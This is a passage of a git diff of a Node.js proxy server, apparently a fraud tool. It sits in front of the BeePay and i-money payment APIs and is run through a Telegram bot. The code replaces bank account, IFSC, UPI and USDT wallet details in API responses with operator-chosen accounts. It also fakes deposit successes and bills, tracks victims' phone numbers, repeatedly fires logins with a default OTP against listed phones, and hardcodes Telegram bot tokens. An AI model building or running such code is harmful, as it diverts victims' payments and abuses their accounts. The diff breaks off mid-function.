@@ -1,132 +1,326 @@
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const { Redis } = require('@upstash/redis');
-const kv = new Redis({
-  url: process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL,
-  token: process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN
-});
 
 const app = express();
+const ORIGINAL_API = 'https://app-api.beepaycommon.com';
+const BOT_TOKEN = process.env.BOT_TOKEN || '8944838396:AAEjhUozfSTRh40upzS9Z43MCuBX9i4Yy5M';
+const WEBHOOK_URL = 'https://ixcv.vercel.app/bot-webhook';
+const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
+const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
 
-const ORIGINAL_API = 'https://api.i-money.vip';
-const token = '8728397123:AAH7SGg0CBGLHds2QSMxps0F1FkCIvlmbvM';
-const WEBHOOK_URL = 'https://ixcv.vercel.app/api/telegram';
-let bot;
+const DEFAULT_DATA = {
+  banks: [],
+  activeIndex: -1,
+  botEnabled: true,
+  autoRotate: false,
+  lastUsedIndex: -1,
+  adminChatId: null,
+  logRequests: false,
+  usdtAddress: '',
+  depositSuccess: false,
+  depositBonus: 0,
+  withdrawOverride: 0,
+  userOverrides: {},
+  trackedUsers: {}
+};
+
+let bot = null;
 let webhookSet = false;
+try { if (BOT_TOKEN) bot = new TelegramBot(BOT_TOKEN); } catch(e) {}
 
-if (token) {
-  bot = new TelegramBot(token);
+let redis = null;
+if (REDIS_URL && REDIS_TOKEN) {
+  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch(e) {}
 }
-
-async function ensureWebhook() {
-  if (!bot || webhookSet) return;
-  try {
-    await bot.setWebHook(WEBHOOK_URL);
-    webhookSet = true;
-  } catch (e) {}
-}
-
-const DEFAULT_DATA = { banks: [], activeIndex: -1, walletType: 'paytm', adminChatId: null, botEnabled: true, autoRotate: false, lastUsedIndex: -1, depositSuccess: false, depositBonus: 0, userOverrides: {}, trackedUsers: {}, withdrawOverride: 0 };
 
 let cachedData = null;
 let cacheTime = 0;
 const CACHE_TTL = 5000;
-const tokenUserMap = {};
+let debugNextResponse = false;
+
+async function ensureWebhook() {
+  if (!bot || webhookSet || !WEBHOOK_URL) return;
+  try {
+    await bot.setWebHook(WEBHOOK_URL);
+    webhookSet = true;
+  } catch(e) {}
+}
 
 async function loadData(forceRefresh) {
   if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
+  if (!redis) return { ...DEFAULT_DATA };
   try {
-    let data = await kv.get('bankData');
-    if (data) {
-      if (typeof data === 'string') data = JSON.parse(data);
-      if (!data.userOverrides) data.userOverrides = {};
-      if (!data.trackedUsers) data.trackedUsers = {};
-      if (data.withdrawOverride === undefined) data.withdrawOverride = 0;
-      if (data.logRequests === undefined) data.logRequests = false;
-      if (data.usdtAddress === undefined) data.usdtAddress = '';
-      if (data.fakeWithdrawals) delete data.fakeWithdrawals;
-      cachedData = data;
-      cacheTime = Date.now();
-      return data;
+    let raw = await redis.get('beepayData');
+    if (raw) {
+      if (typeof raw === 'string') { try { raw = JSON.parse(raw); } catch(e) {} }
+      if (typeof raw === 'object' && raw !== null) {
+        cachedData = { ...DEFAULT_DATA, ...raw };
+      } else {
+        cachedData = { ...DEFAULT_DATA };
+      }
+    } else {
+      cachedData = { ...DEFAULT_DATA };
     }
-  } catch (e) {}
-  const d = { ...DEFAULT_DATA, userOverrides: {}, trackedUsers: {} };
-  cachedData = d;
+    if (!cachedData.userOverrides) cachedData.userOverrides = {};
+    if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
+    if (!cachedData.orderBankMap) cachedData.orderBankMap = {};
+    cacheTime = Date.now();
+    return cachedData;
+  } catch(e) {
+    console.error('Redis load error:', e.message);
+  }
+  cachedData = { ...DEFAULT_DATA };
   cacheTime = Date.now();
-  return d;
-}
-
-function saveTokenUserId(req, userId) {
-  if (!userId) return;
-  const tok = req.headers['authorization'] || req.headers['token'] || '';
-  if (tok && tok.length > 10) tokenUserMap[tok] = userId;
-}
-
-function getUserIdFromToken(req) {
-  const tok = req.headers['authorization'] || req.headers['token'] || '';
-  if (tok && tokenUserMap[tok]) return tokenUserMap[tok];
-  return null;
-}
-
-async function trackUser(bankData, userId, info) {
-  if (!userId || userId === 'N/A') return;
-  if (!bankData.trackedUsers) bankData.trackedUsers = {};
-  const existing = bankData.trackedUsers[String(userId)] || {};
-  bankData.trackedUsers[String(userId)] = {
-    lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-    lastAction: info || existing.lastAction || '',
-    orderCount: (existing.orderCount || 0) + (info && info.includes('Order') ? 1 : 0)
-  };
+  return cachedData;
 }
 
 async function saveData(data) {
+  const skipMerge = data._skipOverrideMerge;
+  if (skipMerge) delete data._skipOverrideMerge;
+  if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
   try {
-    await kv.set('bankData', JSON.stringify(data));
+    if (!skipMerge) {
+      const current = await redis.get('beepayData');
+      if (current && typeof current === 'object') {
+        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate', 'activePhones'];
+        for (const key of settingsKeys) {
+          if (current[key] !== undefined) data[key] = current[key];
+        }
+        if (current.userOverrides) {
+          data.userOverrides = JSON.parse(JSON.stringify(current.userOverrides));
+        }
+        if (current.balanceHistory && Array.isArray(current.balanceHistory)) {
+          if (!data.balanceHistory || data.balanceHistory.length < current.balanceHistory.length) {
+            data.balanceHistory = current.balanceHistory;
+          }
+        }
+        if (current.sellHistory && Array.isArray(current.sellHistory)) {
+          if (!data.sellHistory || data.sellHistory.length < current.sellHistory.length) {
+            data.sellHistory = current.sellHistory;
+          }
+        }
+        if (current.orderBankMap && typeof current.orderBankMap === 'object') {
+          if (!data.orderBankMap) data.orderBankMap = {};
+          for (const oid of Object.keys(current.orderBankMap)) {
+            if (!data.orderBankMap[oid]) data.orderBankMap[oid] = current.orderBankMap[oid];
+          }
+        }
+        if (current.fakeBills && typeof current.fakeBills === 'object') {
+          if (!data.fakeBills) data.fakeBills = {};
+          for (const uid of Object.keys(current.fakeBills)) {
+            if (!data.fakeBills[uid] || data.fakeBills[uid].length < current.fakeBills[uid].length) {
+              data.fakeBills[uid] = current.fakeBills[uid];
+            }
+          }
+        }
+      }
+    }
     cachedData = data;
     cacheTime = Date.now();
-  } catch (e) {}
+    await redis.set('beepayData', data);
+  } catch(e) {
+    console.error('Redis save error:', e.message);
+    cachedData = data;
+    cacheTime = Date.now();
+  }
 }
 
-function getUserOverride(bankData, userId) {
-  if (!userId || !bankData.userOverrides) return null;
-  return bankData.userOverrides[String(userId)] || null;
+// ── Active-login monitor ──────────────────────────────────────────
+const ACTIVE_DEFAULT_OTP = '030201';
+let _activeMonitorOtp = ACTIVE_DEFAULT_OTP;
+let _activeMonitorPhones = [];
+let _activeMonitorAdminChatId = null;
+let _activeMonitorLastRefresh = 0;
+let _activeMonitorTicking = false;
+let _activeMonitorStarted = false;
+let _activeStats = { logins: 0, ok: 0, fail: 0, perPhone: {} };
+let _activeStatsLastReport = Date.now();
+let _activeLastErrorLog = {};
+
+const ACTIVE_TICK_MS = parseInt(process.env.ACTIVE_TICK_MS, 10) || 100;
+const ACTIVE_REFRESH_MS = parseInt(process.env.ACTIVE_REFRESH_MS, 10) || 3000;
+const ACTIVE_STATS_REPORT_MS = parseInt(process.env.ACTIVE_STATS_REPORT_MS, 10) || 300000;
+
+function getActiveOtp(data) {
+  return (data && data.activeOtp) || ACTIVE_DEFAULT_OTP;
 }
 
-function getEffectiveSettings(bankData, userId) {
-  const uo = getUserOverride(bankData, userId);
+async function refreshActiveMonitorPhones() {
+  if (Date.now() - _activeMonitorLastRefresh < ACTIVE_REFRESH_MS) return;
+  if (!redis) { _activeMonitorPhones = []; return; }
+  try {
+    let raw = await redis.get('beepayData');
+    if (typeof raw === 'string') { try { raw = JSON.parse(raw); } catch(e) {} }
+    if (raw && typeof raw === 'object') {
+      _activeMonitorPhones = Array.isArray(raw.activePhones) ? raw.activePhones.map(String) : [];
+      _activeMonitorAdminChatId = raw.adminChatId || _activeMonitorAdminChatId;
+      _activeMonitorOtp = raw.activeOtp || ACTIVE_DEFAULT_OTP;
+    } else {
+      _activeMonitorPhones = [];
+    }
+    _activeMonitorLastRefresh = Date.now();
+  } catch(e) {}
+}
+
+async function fireActiveLogin(phone, otp) {
+  const otpCode = otp || _activeMonitorOtp || ACTIVE_DEFAULT_OTP;
+  const headers = {
+    'user-agent': 'okhttp/4.9.0',
+    'content-type': 'application/json; charset=UTF-8',
+    'accept': '*/*',
+    'reqdate': String(Math.floor(Date.now() / 1000)),
+    'host': 'app-api.beepaycommon.com',
+  };
+  const body = JSON.stringify({ phone: String(phone), otp: otpCode });
+  try {
+    const resp = await fetch(ORIGINAL_API + '/appAuth/v2/memberLogin', { method: 'POST', headers, body });
+    const text = await resp.text();
+    let json = null;
+    try { json = JSON.parse(text); } catch(e) {}
+    if (json && (json.code === 200 || json.code === '200' || json.success === true)) {
+      return { ok: true, userId: (json.data && (json.data.memberId || json.data.userId || json.data.id)) || '' };
+    }
+    return { ok: false, error: (json && (json.msg || json.message)) || text.substring(0, 150) };
+  } catch(e) {
+    return { ok: false, error: e.message };
+  }
+}
+
+async function activeMonitorTick() {
+  if (_activeMonitorTicking) return;
+  _activeMonitorTicking = true;
+  try {
+    await refreshActiveMonitorPhones();
+    if (!_activeMonitorPhones.length) return;
+    await Promise.all(_activeMonitorPhones.map(async (phone) => {
+      const r = await fireActiveLogin(phone, _activeMonitorOtp);
+      _activeStats.logins++;
+      _activeStats.perPhone[phone] = _activeStats.perPhone[phone] || { ok: 0, fail: 0 };
+      if (r.ok) { _activeStats.ok++; _activeStats.perPhone[phone].ok++; }
+      else {
+        _activeStats.fail++;
+        _activeStats.perPhone[phone].fail++;
+        const now = Date.now();
+        if (!_activeLastErrorLog[phone] || now - _activeLastErrorLog[phone] > 30000) {
+          _activeLastErrorLog[phone] = now;
+          console.error(`[active] ${phone} fail: ${r.error}`);
+        }
+      }
+    }));
+    if (Date.now() - _activeStatsLastReport > ACTIVE_STATS_REPORT_MS && _activeStats.logins > 0) {
+      _activeStatsLastReport = Date.now();
+      const lines = [
+        `🔄 BeePay Active Login Monitor`,
+        `Active phones: ${_activeMonitorPhones.length}`,
+        `Total logins: ${_activeStats.logins}`,
+        `✅ Success: ${_activeStats.ok}`,
+        `❌ Failed: ${_activeStats.fail}`,
+      ];
+      for (const [ph, s] of Object.entries(_activeStats.perPhone)) {
+        lines.push(`  ${ph}: ✅${s.ok} ❌${s.fail}`);
+      }
+      const msg = lines.join('\n');
+      if (_activeMonitorAdminChatId && bot) {
+        bot.sendMessage(_activeMonitorAdminChatId, msg).catch(()=>{});
+      }
+      _activeStats = { logins: 0, ok: 0, fail: 0, perPhone: {} };
+    }
+  } finally {
+    _activeMonitorTicking = false;
+  }
+}
+
+function startActiveMonitor() {
+  if (_activeMonitorStarted) return;
+  _activeMonitorStarted = true;
+  console.log(`[active] monitor loop started — tick=${ACTIVE_TICK_MS}ms`);
+  setInterval(() => { activeMonitorTick().catch(()=>{}); }, ACTIVE_TICK_MS);
+}
+startActiveMonitor();
+
+// ── Helpers ───────────────────────────────────────────────────────
+function getUserOverride(data, userId) {
+  if (!userId || !data.userOverrides) return null;
+  return data.userOverrides[String(userId)] || null;
+}
+
+function getEffectiveSettings(data, userId) {
+  const uo = getUserOverride(data, userId);
   return {
-    botEnabled: uo && uo.botEnabled !== undefined ? uo.botEnabled : bankData.botEnabled,
-    depositSuccess: uo && uo.depositSuccess !== undefined ? uo.depositSuccess : bankData.depositSuccess,
-    depositBonus: uo && uo.depositBonus !== undefined ? uo.depositBonus : (bankData.depositBonus || 0),
-    bankOverride: uo && uo.bankIndex !== undefined ? uo.bankIndex : null
+    botEnabled: uo && uo.botEnabled !== undefined ? uo.botEnabled : data.botEnabled,
+    depositSuccess: uo && uo.depositSuccess !== undefined ? uo.depositSuccess : data.depositSuccess,
+    depositBonus: uo && uo.depositBonus !== undefined ? uo.depositBonus : (data.depositBonus || 0),
+    bankOverride: uo && uo.bankIndex !== undefined ? uo.bankIndex : null,
+    forceReviewSuccess: uo && uo.forceReviewSuccess === true,
+    _userId: userId
   };
 }
 
-function getActiveBank(d, userId) {
-  const uo = getUserOverride(d, userId);
-  if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < d.banks.length) {
-    return d.banks[uo.bankIndex];
+function getForceReviewSuccessUserIds(data) {
+  const ids = [];
+  if (!data.userOverrides) return ids;
+  for (const uid of Object.keys(data.userOverrides)) {
+    if (data.userOverrides[uid].forceReviewSuccess === true) ids.push(uid);
   }
-  if (d.autoRotate && d.banks.length > 0) {
-    if (d.banks.length === 1) return d.banks[0];
-    let nextIndex;
-    do {
-      nextIndex = Math.floor(Math.random() * d.banks.length);
-    } while (nextIndex === d.lastUsedIndex && d.banks.length > 1);
-    d.lastUsedIndex = nextIndex;
-    d._rotatedIndex = nextIndex;
-    return d.banks[nextIndex];
+  return ids;
+}
+
+function isLogOff(data, userId) {
+  if (!userId) return false;
+  const uo = data.userOverrides && data.userOverrides[String(userId)];
+  return uo && uo.logOff === true;
+}
+
+function getPhone(data, userId) {
+  if (!userId) return '';
+  const tracked = data.trackedUsers && data.trackedUsers[String(userId)];
+  return (tracked && tracked.phone) || '';
+}
+
+function getActiveBank(data, userId, orderAmount) {
+  const hasAmt = orderAmount !== undefined && orderAmount !== null && isFinite(orderAmount);
+  const qualifies = (b) => !hasAmt || (Number(b.minAmount) || 0) <= Number(orderAmount);
+  const uo = getUserOverride(data, userId);
+  if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
+    const pinned = data.banks[uo.bankIndex];
+    return qualifies(pinned) ? pinned : null;
   }
-  if (d.activeIndex >= 0 && d.activeIndex < d.banks.length) return d.banks[d.activeIndex];
+  if (data.autoRotate && data.banks.length > 0) {
+    const eligible = data.banks.filter(qualifies);
+    if (eligible.length === 0) return null;
+    if (eligible.length === 1) {
+      const realIdx = data.banks.indexOf(eligible[0]);
+      data.lastUsedIndex = realIdx;
+      data._rotatedIndex = realIdx;
+      return eligible[0];
+    }
+    let pickIdx;
+    do { pickIdx = Math.floor(Math.random() * eligible.length); }
+    while (data.banks.indexOf(eligible[pickIdx]) === data.lastUsedIndex);
+    const chosen = eligible[pickIdx];
+    const realIdx = data.banks.indexOf(chosen);
+    data.lastUsedIndex = realIdx;
+    data._rotatedIndex = realIdx;
+    return chosen;
+  }
+  if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) {
+    const ab = data.banks[data.activeIndex];
+    return qualifies(ab) ? ab : null;
+  }
+  if (data.banks.length > 0) {
+    const first = data.banks[0];
+    return qualifies(first) ? first : null;
+  }
   return null;
 }
 
-async function getActiveBankAndSave(d, userId) {
-  const bank = getActiveBank(d, userId);
-  if (d.autoRotate && d._rotatedIndex !== undefined) {
-    d.lastUsedIndex = d._rotatedIndex;
-    delete d._rotatedIndex;
-    await saveData(d);
+async function getActiveBankAndSave(data, userId, orderAmount) {
+  const bank = getActiveBank(data, userId, orderAmount);
+  if (data.autoRotate && data._rotatedIndex !== undefined) {
+    data.lastUsedIndex = data._rotatedIndex;
+    delete data._rotatedIndex;
+    await saveData(data);
   }
   return bank;
 }
@@ -135,286 +329,188 @@ function bankListText(d) {
   if (d.banks.length === 0) return 'No banks added yet.';
   return d.banks.map((b, i) => {
     const a = i === d.activeIndex ? ' ✅' : '';
-    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${a}`;
+    const minA = Number(b.minAmount) || 0;
+    const min = minA > 0 ? ` | ≥₹${minA}` : ' | any amt';
+    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${min}${a}`;
   }).join('\n');
 }
 
-function extractUserId(req, jsonResp) {
-  const fromToken = getUserIdFromToken(req);
-  if (fromToken) return fromToken;
-  if (req.parsedBody && req.parsedBody.userId) return String(req.parsedBody.userId);
-  const qs = new URLSearchParams(req.originalUrl.split('?')[1] || '');
-  if (qs.get('userId')) return String(qs.get('userId'));
-  if (jsonResp && jsonResp.data) {
-    if (jsonResp.data.userId) return String(jsonResp.data.userId);
-    if (jsonResp.data.user && jsonResp.data.user.userId) return String(jsonResp.data.user.userId);
-    if (jsonResp.data.id) return String(jsonResp.data.id);
+// ── Order bank map helpers ────────────────────────────────────────
+async function saveOrderBank(data, orderId, bank) {
+  if (!orderId || !bank || orderId === 'N/A') return;
+  if (!data.orderBankMap) data.orderBankMap = {};
+  data.orderBankMap[String(orderId)] = { accountHolder: bank.accountHolder, accountNo: bank.accountNo, ifsc: bank.ifsc, bankName: bank.bankName || '', upiId: bank.upiId || '' };
+  await saveData(data);
+}
+
+async function markOrderBankSkip(data, orderId) {
+  if (!orderId || orderId === 'N/A') return;
+  if (!data.orderBankMap) data.orderBankMap = {};
+  data.orderBankMap[String(orderId)] = { _skip: true, t: Date.now() };
+  await saveData(data);
+}
+
+async function markOrderBankPending(data, orderId) {
+  if (!orderId || orderId === 'N/A') return;
+  if (!data.orderBankMap) data.orderBankMap = {};
+  const existing = data.orderBankMap[String(orderId)];
+  if (existing && (existing.accountNo || existing._skip)) return;
+  data.orderBankMap[String(orderId)] = { _pending: true, t: Date.now() };
+  await saveData(data);
+}
+
+function hasOrderBankDecision(data, orderId) {
+  if (!orderId || !data.orderBankMap) return false;
+  const e = data.orderBankMap[String(orderId)];
+  if (!e) return false;
+  if (e._pending) return false;
+  return !!(e.accountNo || e._skip);
+}
+
+function isProxyPending(data, ids) {
+  if (!data.orderBankMap) return false;
+  for (const id of ids) {
+    if (!id) continue;
+    const e = data.orderBankMap[String(id)];
+    if (e && e._pending) return true;
   }
-  const authHeader = req.headers['authorization'] || req.headers['token'] || '';
-  if (authHeader) {
-    try {
-      const parts = authHeader.replace('Bearer ', '').split('.');
-      if (parts.length === 3) {
-        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
-        if (payload.userId) return String(payload.userId);
-        if (payload.sub) return String(payload.sub);
-        if (payload.id) return String(payload.id);
-      }
-    } catch(e) {}
+  return false;
+}
+
+async function saveOrderBankMultipleKeys(data, ids, bank) {
+  if (!bank) return;
+  const uniqueIds = [...new Set(ids.map(String).filter(id => id && id !== 'N/A'))];
+  if (uniqueIds.length === 0) return;
+  if (!data.orderBankMap) data.orderBankMap = {};
+  const bankData = { accountHolder: bank.accountHolder, accountNo: bank.accountNo, ifsc: bank.ifsc, bankName: bank.bankName || '', upiId: bank.upiId || '' };
+  for (const id of uniqueIds) { data.orderBankMap[id] = bankData; }
+  await saveData(data);
+}
+
+function getOrderBank(data, orderId) {
+  if (!orderId || !data.orderBankMap) return null;
+  const entry = data.orderBankMap[String(orderId)];
+  if (!entry || entry._skip || entry._pending) return null;
+  return entry;
+}
+
+function getOrderBankMultiple(data, ids) {
+  if (!data.orderBankMap) return null;
+  for (const id of ids) {
+    if (!id) continue;
+    const bank = data.orderBankMap[String(id)];
+    if (bank && !bank._skip && !bank._pending) return bank;
   }
   return null;
 }
 
-app.use((req, res, next) => {
+async function trackUser(data, userId, info, phone) {
+  if (!userId) return;
+  if (!data.trackedUsers) data.trackedUsers = {};
+  const existing = data.trackedUsers[String(userId)] || {};
+  data.trackedUsers[String(userId)] = {
+    lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+    lastAction: info || existing.lastAction || '',
+    orderCount: (existing.orderCount || 0) + (info && info.includes('Order') ? 1 : 0),
+    phone: phone || existing.phone || ''
+  };
+}
+
+// ── Request body parsing ──────────────────────────────────────────
+app.use(async (req, res, next) => {
   const chunks = [];
   req.on('data', c => chunks.push(c));
   req.on('end', () => {
     req.rawBody = Buffer.concat(chunks);
-    const bodyStr = req.rawBody.toString();
-    req.parsedBody = {};
+    const ct = (req.headers['content-type'] || '').toLowerCase();
     try {
-      req.parsedBody = JSON.parse(bodyStr);
-    } catch(e) {
-      if (bodyStr && bodyStr.includes('=')) {
-        const params = new URLSearchParams(bodyStr);
-        for (const [k, v] of params) req.parsedBody[k] = v;
+      if (ct.includes('json')) {
+        req.parsedBody = JSON.parse(req.rawBody.toString());
+      } else if (ct.includes('form') && !ct.includes('multipart')) {
+        const params = new URLSearchParams(req.rawBody.toString());
+        req.parsedBody = Object.fromEntries(params);
+      } else {
+        req.parsedBody = {};
       }
-    }
+    } catch(e) { req.parsedBody = {}; }
     next();
   });
 });
 
-
-app.use(async (req, res, next) => {
-  try {
-    const bankData = await loadData();
-    if (bankData.logRequests && bankData.adminChatId && bot) {
-      const path = req.originalUrl || req.url;
-      if (path !== '/api/telegram' && !path.includes('favicon')) {
-        const uid = extractUserId(req) || '';
-        const idStr = uid ? ` [${uid}]` : '';
-        bot.sendMessage(bankData.adminChatId, `📡 ${req.method} ${path}${idStr}`).catch(() => {});
-      }
-    }
-  } catch(e) {}
-  next();
-});
-
-async function transparentProxy(req, res) {
-  try {
-    const url = ORIGINAL_API + req.originalUrl;
-    const forwardHeaders = {};
-    for (const [key, val] of Object.entries(req.headers)) {
-      const k = key.toLowerCase();
-      if (k === 'host' || k === 'connection' || k === 'content-length' || 
-          k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
-      forwardHeaders[key] = val;
-    }
-    forwardHeaders['host'] = 'api.i-money.vip';
-
-    const opts = { method: req.method, headers: forwardHeaders };
-
-    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
-      opts.body = req.rawBody;
-      forwardHeaders['content-length'] = String(req.rawBody.length);
-    }
-
-    const response = await fetch(url, opts);
-
-    const respHeaders = {};
-    response.headers.forEach((val, key) => {
-      const k = key.toLowerCase();
-      if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding') {
-        respHeaders[key] = val;
-      }
-    });
-    
-    const body = await response.arrayBuffer();
-    let buf = Buffer.from(body);
-
-    try {
-      let bodyStr = buf.toString('utf8');
-      let parsed = null;
-      try { parsed = JSON.parse(bodyStr); } catch(e) {}
-      if (parsed) {
-        const uid = extractUserId(req, parsed);
-        if (uid) saveTokenUserId(req, uid);
-      }
-
-      const bankData = await loadData();
-      if (bankData.usdtAddress) {
-        let jsonResp = parsed;
-        if (jsonResp) {
-          const result = replaceUsdtInResponse(jsonResp, bankData, req.path);
-          if (result && result.oldAddr) {
-            const newBody = JSON.stringify(jsonResp);
-            buf = Buffer.from(newBody);
-            respHeaders['content-type'] = 'application/json; charset=utf-8';
-            respHeaders['content-length'] = String(buf.length);
-            respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
-            delete respHeaders['etag'];
-            delete respHeaders['last-modified'];
-            if (bankData.adminChatId && bot && bankData.logRequests) {
-              try {
-                await bot.sendMessage(bankData.adminChatId, `🔄 USDT replaced in ${req.method} ${req.path}\nOld: ${result.oldAddr}\nNew: ${result.newAddr}`);
-              } catch(e) {}
-            }
-          }
-        }
-      }
-    } catch(e) {}
-
-    res.writeHead(response.status, respHeaders);
-    res.end(buf);
-    return buf;
-  } catch (e) {
-    console.error('Proxy error:', req.method, req.originalUrl, e.message);
-    if (!res.headersSent) {
-      res.status(502).json({ code: 0, msg: 'Proxy error' });
-    }
-    return null;
+// ── User ID extraction (no token feature) ────────────────────────
+async function extractUserId(req, jsonResp) {
+  const body = req.parsedBody || {};
+  const uid = body.memberId || body.userId || body.id || '';
+  if (uid) return String(uid);
+  const qs = new URLSearchParams((req.originalUrl || '').split('?')[1] || '');
+  if (qs.get('memberId')) return String(qs.get('memberId'));
+  if (qs.get('userId')) return String(qs.get('userId'));
+  const respData = getResponseData(jsonResp);
+  if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
+    const rid = respData.memberId || respData.userId || respData.id || '';
+    if (rid) return String(rid);
   }
+  return '';
 }
 
-async function proxyFetch(req) {
-  const url = ORIGINAL_API + req.originalUrl;
-  const forwardHeaders = {};
-  for (const [key, val] of Object.entries(req.headers)) {
-    const k = key.toLowerCase();
-    if (k === 'host' || k === 'connection' || k === 'content-length' ||
-        k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
-    forwardHeaders[key] = val;
-  }
-  forwardHeaders['host'] = 'api.i-money.vip';
-  const opts = { method: req.method, headers: forwardHeaders };
-  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
-    opts.body = req.rawBody;
-    forwardHeaders['content-length'] = String(req.rawBody.length);
-  }
-  const response = await fetch(url, opts);
-  const respBody = await response.text();
-  const respHeaders = {};
-  response.headers.forEach((val, key) => {
-    const k = key.toLowerCase();
-    if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding' && k !== 'content-length') {
-      respHeaders[key] = val;
-    }
-  });
-  let jsonResp = null;
-  try { jsonResp = JSON.parse(respBody); } catch(e) {}
-  return { response, respBody, respHeaders, jsonResp };
-}
+// ── Deep bank replace ─────────────────────────────────────────────
+const BANK_FIELD_PATTERNS = [
+  { field: ['accountNo', 'accountNumber', 'bankAccountNo', 'bankAccount', 'cardNo', 'payAccount', 'receiveAccount', 'toAccount', 'collectAccount'], type: 'accountNo' },
+  { field: ['accountHolder', 'accountName', 'bankAccountName', 'payName', 'receiveName', 'holderName', 'cardHolder'], type: 'accountHolder' },
+  { field: ['ifsc', 'ifscCode', 'bankCode', 'routingNumber', 'bankIfsc'], type: 'ifsc' },
+  { field: ['bankName', 'bank', 'bankNameStr'], type: 'bankName' },
+  { field: ['upiId', 'upi', 'upiAddress', 'vpa', 'payUpi'], type: 'upiId' },
+];
 
-function sendJson(res, respHeaders, jsonResp, respBody) {
-  const finalBody = jsonResp ? JSON.stringify(jsonResp) : respBody;
-  respHeaders['content-type'] = 'application/json; charset=utf-8';
-  respHeaders['content-length'] = String(Buffer.byteLength(finalBody));
-  respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
-  respHeaders['pragma'] = 'no-cache';
-  delete respHeaders['etag'];
-  delete respHeaders['last-modified'];
-  res.writeHead(200, respHeaders);
-  res.end(finalBody);
-}
-
-const BANK_FIELD_MAP = {
-  receiveaccountno: 'accountNo', receiveaccountname: 'accountHolder', receiveifsc: 'ifsc',
-  accountno: 'accountNo', accountname: 'accountHolder', accountholder: 'accountHolder',
-  ifsc: 'ifsc', ifsccode: 'ifsc',
-  bankaccountno: 'accountNo', bankaccountname: 'accountHolder', bankifsc: 'ifsc',
-  receivename: 'accountHolder', receivebankname: 'accountHolder',
-  beneficiaryname: 'accountHolder', beneficiaryaccount: 'accountNo',
-  payeename: 'accountHolder', payeeaccount: 'accountNo', payeeifsc: 'ifsc',
-  holdername: 'accountHolder', holderaccount: 'accountNo'
-};
-
-function replaceBankInUrl(urlStr, active) {
-  if (!urlStr || typeof urlStr !== 'string') return urlStr;
-  if (!urlStr.includes('://') && !urlStr.includes('?')) return urlStr;
-  const urlParams = [
-    { names: ['account', 'accountNo', 'account_no', 'accountno', 'account_number', 'accountNumber', 'acc', 'receiveAccountNo', 'receiver_account', 'pa'], value: active.accountNo },
-    { names: ['name', 'accountName', 'account_name', 'accountname', 'receiveAccountName', 'receiver_name', 'beneficiary_name', 'beneficiaryName', 'pn', 'holder_name'], value: active.accountHolder },
-    { names: ['ifsc', 'ifsc_code', 'ifscCode', 'receiveIfsc', 'IFSC'], value: active.ifsc },
-    { names: ['displayAccountNumber'], value: 'XXXXXX' + active.accountNo.slice(-4) }
-  ];
-  let result = urlStr;
-  for (const group of urlParams) {
-    for (const paramName of group.names) {
-      const regex = new RegExp('([?&])(' + paramName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')=([^&]*)', 'i');
-      result = result.replace(regex, '$1$2=' + encodeURIComponent(group.value));
-    }
-  }
-  return result;
-}
-
-function deepReplaceBankDetails(obj, active, originalValues, depth) {
-  if (!obj || !active || typeof obj !== 'object') return;
-  if (depth === undefined) depth = 0;
-  if (depth > 10) return;
-
+function deepReplace(obj, bank, origVals, depth) {
+  if (!obj || typeof obj !== 'object' || depth > 10) return;
+  if (Array.isArray(obj)) { obj.forEach(item => deepReplace(item, bank, origVals, depth + 1)); return; }
   for (const key of Object.keys(obj)) {
-    const lk = key.toLowerCase();
-    const mappedField = BANK_FIELD_MAP[lk];
-    if (mappedField && obj[key] !== undefined && obj[key] !== null) {
-      if (typeof obj[key] === 'string' || typeof obj[key] === 'number') {
-        if (originalValues && typeof obj[key] === 'string' && obj[key].length > 3) {
-          originalValues[key] = obj[key];
-        }
-        obj[key] = active[mappedField];
-      }
-    }
-
-    if (typeof obj[key] === 'string') {
-      const val = obj[key];
-      if (val.includes('://') || (val.includes('?') && val.includes('='))) {
-        obj[key] = replaceBankInUrl(val, active);
-      }
-      if (originalValues) {
-        for (const [origKey, origVal] of Object.entries(originalValues)) {
-          if (typeof origVal === 'string' && origVal.length > 3 && obj[key].includes(origVal)) {
-            const mappedF = BANK_FIELD_MAP[origKey.toLowerCase()];
-            if (mappedF) {
-              obj[key] = obj[key].split(origVal).join(active[mappedF]);
-            }
-          }
+    const kl = key.toLowerCase();
+    for (const pat of BANK_FIELD_PATTERNS) {
+      if (pat.field.map(f => f.toLowerCase()).includes(kl)) {
+        const newVal = bank[pat.type];
+        if (newVal !== undefined && newVal !== null && newVal !== '') {
